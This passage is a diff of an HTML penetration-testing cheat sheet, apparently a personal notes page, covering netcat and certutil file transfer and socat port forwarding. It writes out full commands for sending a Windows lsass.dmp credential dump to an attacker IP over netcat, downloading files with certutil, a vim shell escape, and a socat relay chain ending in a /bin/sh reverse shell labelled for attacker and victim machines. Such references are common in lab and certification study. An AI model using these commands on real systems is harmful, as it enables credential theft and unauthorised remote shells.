@@ -168,36 +168,35 @@ vim -c ':!/bin/sh'                  #vim</code></pre>
                 <ul>
                     <h2>NetCat</h2>
                     <ul>
+                        <h3>Linux -> Linux</h3>
+                        <ul>
+                            <p>Where you recieve the file</p>
+                            <pre><code class="language-bash">nc -l -p 1234 -q 1 > FILE < /dev/null</code> </pre>
+                            <p>From where you transfer the file</p>
+                            <pre><code class="language-bash">cat FILE | nc TARGET_IP TARGET_PORT</code> </pre>
+                        </ul>
 
-                    <h3>Linux -> Linux</h3>
-                    <ul>
-                        <p>Where you recieve the file</p>
-                        <pre><code class="language-bash">nc -l -p 1234 -q 1 > FILE < /dev/null</code> </pre>
-                        <p>From where you transfer the file</p>
-                        <pre><code class="language-bash">cat FILE | nc TARGET_IP TARGET_PORT</code> </pre>
-                    </ul>
-
-                    <h3>Windows -> Linux</h3>
-                    <ul>
-                        <p>Where you recieve the file</p>
-                        <pre><code class="language-python">nc -lvnp 7777 > lsass.dmp</code> </pre>
-                        <p>From where you transfer the file</p>
-                        <pre><code class="language-python">type C:\Users\alaading\Desktop\lsass.dmp | .\nc.exe 10.10.14.91 7777</code> </pre>
-                       
-
-                    </ul>
-                
+                        <h3>Windows -> Linux</h3>
+                        <ul>
+                            <p>Where you recieve the file</p>
+                            <pre><code class="language-python">nc -lvnp 7777 > lsass.dmp</code> </pre>
+                            <p>From where you transfer the file</p>
+                            <pre><code class="language-python">type C:\Users\alaading\Desktop\lsass.dmp | .\nc.exe 10.10.14.91 7777</code> </pre>
+                        </ul>
                     </ul>    
 
 
 
-                    <h2>CertUtil</h2>
-                    <ul>
-                    <p>It's like WGET</p>
-                    <pre><code class="language-python">certutil -urlcache -split -f "http://192.168.1.1/resource"</code> </pre>
-                    </ul>    
+                <h2>CertUtil</h2>
+                <ul>
+                <p>It's like WGET</p>
+                <pre><code class="language-python">certutil -urlcache -split -f "http://192.168.1.1/resource"</code> </pre>
+                </ul>    
 
-
+                <h2>Using /dev/tcp</h2>
+                <ul>
+                    <p>There are methods to perform transfers by using /dev/tcp from linux. In case you are not </p>
+                </ul> 
 
 
                 <h2> Python </h2>
@@ -551,6 +550,45 @@ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPqRDQ0mTYDYnx0cJOUWyNGGrhhjYddfIIoO9H
                         <p>Then pres <b>y</b> to generate a report</p>
                 </ul>    
             </div>
+
+            <div class="notion-header">
+                <h1 id="Port Forwarding chisel">Socat situations</h1>
+            </div>
+
+            <div class="banner">
+                <ul>
+                    <h2>Stuck in a network segment</h2>
+                    <ul>
+                        <p>Supose you are stuck in a machine were you can't reach even if you use ligolo. </p>
+                    </ul>
+                        
+                </ul>
+            </div>
+
+            <div class="notion-header">
+                <h1 id="Socat forwarding">Socat forwarding</h1>
+            </div>
+
+            <div class="banner">
+                <ul>
+                    <h2>Connecting two stream sources</h2>
+                    <ul>
+                        <p>Method for performing a simple connection</p>
+                        <pre><code class="language-bash">nc -l localhost 1234 #Attacker machine
+socat TCP-LISTEN:7777 stdout  #Victim machine
+                        </code></pre>
+                    </ul>
+
+                    <h2>Forwarding a Stream</h2>
+                    <p>Here i show you how to forward the connection with a hop box. Here we have 3 box.</p>
+                    <pre><code class="language-bash">socat file:`tty`,raw,echo=0 TCP-LISTEN:7777  #First box just listenning in port 7777
+                    socat TCP-LISTEN:4321,fork TCP:localhost:7777  #Second box or middle redirecting all traffic from port 4321 to port 7777
+                    socat EXEC:/bin/sh,pty,stderr,setsid,sigint,sane TCP:localhost:4321  #Third machine performing a connection using /bin/sh to port 4321</code></pre>
+                    
+
+                </ul>
+            </div>
+
 
             <div class="notion-header">
                 <h1 id="Port Forwarding chisel">Port Forwarding chisel</h1>
